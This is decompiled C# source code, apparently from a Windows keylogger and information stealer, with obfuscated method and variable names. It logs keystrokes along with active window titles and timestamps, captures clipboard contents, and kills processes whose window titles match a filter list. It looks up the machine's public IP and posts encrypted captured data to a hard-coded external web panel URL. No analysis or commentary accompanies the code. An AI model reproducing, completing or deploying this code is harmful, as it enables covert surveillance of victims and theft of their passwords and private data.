		string[] array = new string[1]
		{
			"%filter_list%"
		};
		if (array.Length == 0)
		{
			return;
		}
		Process[] processes = Process.GetProcesses();
		Process[] array2 = processes;
		checked
		{
			foreach (Process process in array2)
			{
				int num = array.Length - 1;
				for (int j = 0; j <= num; j++)
				{
					try
					{
						if (process.MainWindowTitle.ToLower().Contains(array[j].ToLower()))
						{
							process.Kill();
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public static void YNO(object WGL_182, ElapsedEventArgs MO_183)
	{
		//Discarded unreachable code: IL_0011, IL_0024
		//IL_001b: Expected O, but got I4
		try
		{
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static string CC(string QL_184)
	{
		//Discarded unreachable code: IL_0164, IL_0177, IL_018a
		//IL_0181: Expected O, but got I4
		//IL_0182: Expected O, but got I4
		string result = default(string);
		try
		{
			@_ _ = new @_("E+MTWs/(En()a3456d3h99sdf9sjdgA&%/+vkm&FGNBDSFs5(TRS%cxv");
			QL_184 = "p=" + _.Encrypt(QL_184);
			string requestUriString = "http://tonishl.ml/nonso/WebPanel/api.php";
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 10000;
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)";
			httpWebRequest.Method = "POST";
			QL_184 = QL_184.Replace("+", "%2B");
			byte[] bytes = Encoding.UTF8.GetBytes(QL_184);
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			string text = "";
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
				using (WebResponse webResponse = httpWebRequest.GetResponse())
				{
					using (Stream stream2 = webResponse.GetResponseStream())
					{
						using (StreamReader streamReader = new StreamReader(stream2))
						{
							text = streamReader.ReadToEnd();
							streamReader.Close();
						}
						stream2.Flush();
						stream2.Close();
					}
					webResponse.Close();
				}
				stream.Flush();
				stream.Close();
				return result;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string QE()
	{
		try
		{
			string input = new WebClient().DownloadString("http://checkip.dyndns.org/");
			return new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}").Matches(input)[0].ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void FN(object RW_185, ref PB.MouseEvent JU_186)
	{
		if (JU_186.Button == MouseButtons.Right)
		{
			JU_186.Handled = true;
		}
	}

	private static void JT(object RZ_187, ref PB.MouseEvent GRC_188)
	{
	}

	private static void AGM(Clipboard ZH_189)
	{
		string text = W.F_4.Clipboard.GetText();
		text = text.Replace("&", "&amp;");
		text = text.Replace("<", "&lt;");
		text = text.Replace(">", "&gt;");
		text = text.Replace("\"", "&quot;");
		if (Operators.CompareString(text, "", false) != 0)
		{
			HDM_38 = HDM_38 + "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" + text + "<span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span><br>";
		}
	}

	[DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
	private static extern IntPtr YCI();

	[DllImport("user32.dll", EntryPoint = "GetWindowText")]
	private static extern int UK(IntPtr QY_190, StringBuilder MC_191, int _M_192);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetWindowTextLength", SetLastError = true)]
	private static extern int TR(IntPtr BAQ_193);

	[DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
	private static extern bool JEL(byte[] CQ_194);

	[DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
	private static extern uint RQF(uint FCD_195, uint _ZF_196);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowThreadProcessId", ExactSpelling = true, SetLastError = true)]
	public static extern int RN(IntPtr SWY_197, ref int MFK_198);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetKeyboardLayout", ExactSpelling = true, SetLastError = true)]
	public static extern int BO(int NC_199);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "ToUnicodeEx", ExactSpelling = true, SetLastError = true)]
	public static extern int SQ(uint XY_200, uint _R_201, byte[] KF_202, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder VL_203, int TQ_204, uint ZV_205, IntPtr FI_206);

	private static string TY()
	{
		//Discarded unreachable code: IL_00ad, IL_00c0
		//IL_00b7: Expected O, but got I4
		//IL_00b8: Expected O, but got I4
		IntPtr intPtr = YCI();
		int MFK_ = 0;
		string str = "";
		RN(intPtr, ref MFK_);
		try
		{
			string processName = Process.GetProcessById(MFK_).ProcessName;
			string productName = FileVersionInfo.GetVersionInfo(Process.GetProcessById(MFK_).MainModule.FileName).ProductName;
			if (productName != null)
			{
				str = productName + ": ";
			}
			else if (processName != null)
			{
				str = processName + ": ";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int num = checked(TR(intPtr) + 1);
		StringBuilder stringBuilder = new StringBuilder(num);
		if (UK(intPtr, stringBuilder, num) > 0)
		{
			return str + stringBuilder.ToString();
		}
		return null;
	}

	private static void TD(Keys BM_207)
	{
		//Discarded unreachable code: IL_081d, IL_0830
		//IL_0827: Expected O, but got I4
		checked
		{
			try
			{
				IntPtr intPtr = YCI();
				int num = TR(intPtr) + 1;
				StringBuilder stringBuilder = new StringBuilder(num);
				int num2 = UK(intPtr, stringBuilder, num);
				if (num2 <= 0)
				{
					goto IL_0113;
				}
				if (!YW_99 || FL_100.Length <= 0)
				{
					goto IL_0087;
				}
				int num3 = FL_100.Length - 1;
				for (int i = 0; i <= num3; i++)
				{
					if (stringBuilder.ToString().ToLower().Contains(FL_100[i]))
					{
						XW_101 = true;
						break;
					}
					XW_101 = false;
				}
				if (XW_101)
				{
					goto IL_0087;
				}
				goto end_IL_0000;
				IL_0087:
				if (Operators.CompareString(TGW_96, stringBuilder.ToString(), false) != 0)
				{
					NW_98 = "<br><span style=font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#0099cc;>[" + TY() + "]<span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;> (" + DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss") + ")</span></span><br>";
					HDM_38 += NW_98;
					TGW_96 = stringBuilder.ToString();
				}
				goto IL_0113;
				IL_0113:
				if (BM_207 == Keys.Back)
				{
					if (YWD_45 == Conversions.ToBoolean("False"))
					{
						HDM_38 += "<font color=#008000>{BACK}</font>";
					}
					else if (Operators.CompareString(HDM_38, "", false) != 0 && Operators.CompareString(HDM_38.Substring(HDM_38.Length - NW_98.Length, NW_98.Length), NW_98, false) != 0)
					{
						string left = HDM_38.Substring(HDM_38.Length - 7);
						if ((Operators.CompareString(left, "</font>", false) != 0) & (Operators.CompareString(HDM_38.Substring(HDM_38.Length - 4), "<br>", false) != 0))
						{
							HDM_38 = HDM_38.Substring(0, HDM_38.Length - 1);
						}
					}
					return;
				}
				unchecked
				{
					if (W.F_4.Keyboard.AltKeyDown && BM_207 == Keys.Tab)
					{
						HDM_38 += "<font color=#008000>{ALT+TAB}</font>";
						return;
					}
					if (W.F_4.Keyboard.AltKeyDown && BM_207 == Keys.F4)
					{
						HDM_38 += "<font color=#008000>{ALT+F4}</font>";
						return;
					}
					switch (BM_207)
					{
					case Keys.Tab:
						HDM_38 += "<font color=#008000>{TAB}</font>";
						return;
					case Keys.Escape:
						HDM_38 += "<font color=#008000>{ESC}</font>";
						return;
					}
					if (BM_207 == Keys.LWin || BM_207 == Keys.RWin)
					{
						HDM_38 += "<font color=#008000>{Win}</font>";
						return;
					}
					switch (BM_207)
					{
					case Keys.Capital:
						HDM_38 += "<font color=#008000>{CAPSLOCK}</font>";
						return;
					case Keys.Up:
						HDM_38 += "<font color=#008000>&uarr;</font>";
						return;
					case Keys.Down:
						HDM_38 += "<font color=#008000>&darr;</font>";
						return;
					case Keys.Left:
						HDM_38 += "<font color=#008000>&larr;</font>";
						return;
					case Keys.Right:
						HDM_38 += "<font color=#008000>&rarr;</font>";
						return;
					case Keys.Delete:
						HDM_38 += "<font color=#008000>{DEL}</font>";
						return;
					case Keys.End:
						HDM_38 += "<font color=#008000>{END}</font>";
						return;
					case Keys.Home:
						HDM_38 += "<font color=#008000>{HOME}</font>";
						return;
					case Keys.Insert:
						HDM_38 += "<font color=#008000>{Insert}</font>";
						return;
					case Keys.NumLock:
						HDM_38 += "<font color=#008000>{NumLock}</font>";
						return;
					case Keys.Next:
						HDM_38 += "<font color=#008000>{PageDown}</font>";
						return;
					case Keys.Prior:
						HDM_38 += "<font color=#008000>{PageUp}</font>";
						return;
					case Keys.Return:
						HDM_38 += "<font color=#008000>{ENTER}</font>";
						HDM_38 += "<br>";
						return;
					case Keys.F1:
						HDM_38 += "<font color=#008000>{F1}</font>";
						return;
					case Keys.F2:
						HDM_38 += "<font color=#008000>{F2}</font>";
						return;
					case Keys.F3:
						HDM_38 += "<font color=#008000>{F3}</font>";
						return;
					case Keys.F4:
						HDM_38 += "<font color=#008000>{F4}</font>";
						return;
					case Keys.F5:
						HDM_38 += "<font color=#008000>{F5}</font>";
						return;
					case Keys.F6:
						HDM_38 += "<font color=#008000>{F6}</font>";
						return;
					case Keys.F7:
						HDM_38 += "<font color=#008000>{F7}</font>";
						return;
					case Keys.F8:
						HDM_38 += "<font color=#008000>{F8}</font>";
						return;
					case Keys.F9:
						HDM_38 += "<font color=#008000>{F9}</font>";
						return;
					case Keys.F10:
						HDM_38 += "<font color=#008000>{F10}</font>";
						return;
					case Keys.F11:
						HDM_38 += "<font color=#008000>{F11}</font>";
						return;
					case Keys.F12:
						HDM_38 += "<font color=#008000>{F12}</font>";
						return;
					case Keys.Space:
						HDM_38 += " ";
						return;
					}
				}
				if (W.F_4.Keyboard.CtrlKeyDown & !W.F_4.Keyboard.AltKeyDown)
				{
					if (BM_207.ToString().ToLower().Contains("control"))
					{
						BU__97 = BM_207.ToString();
						return;
					}
					HDM_38 += "<font color=#008000>{CTRL}</font>";
					HDM_38 += BM_207;
					BU__97 = null;
				}
				else if (W.F_4.Keyboard.CapsLock & !W.F_4.Keyboard.ShiftKeyDown)
				{
					HDM_38 += XE_((uint)BM_207).ToUpper();
				}
				else if (!W.F_4.Keyboard.CapsLock & W.F_4.Keyboard.ShiftKeyDown)
				{
					HDM_38 += XE_((uint)BM_207).ToUpper();
				}
				else if (W.F_4.Keyboard.CapsLock & W.F_4.Keyboard.ShiftKeyDown)
				{
					HDM_38 += XE_((uint)BM_207).ToLower();
				}
				else
				{
					HDM_38 += XE_((uint)BM_207).ToLower();
				}
				end_IL_0000:;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string XE_(uint FW_208)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!JEL(array))
			{
				return "";
			}
			IntPtr sWY_ = YCI();
			int MFK_ = 0;
			int nC_ = RN(sWY_, ref MFK_);
			IntPtr fI_ = (IntPtr)BO(nC_);
			SQ(FW_208, FW_208, array, stringBuilder, 16, 0u, fI_);
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return ((Keys)checked((int)FW_208)).ToString();
	}
}
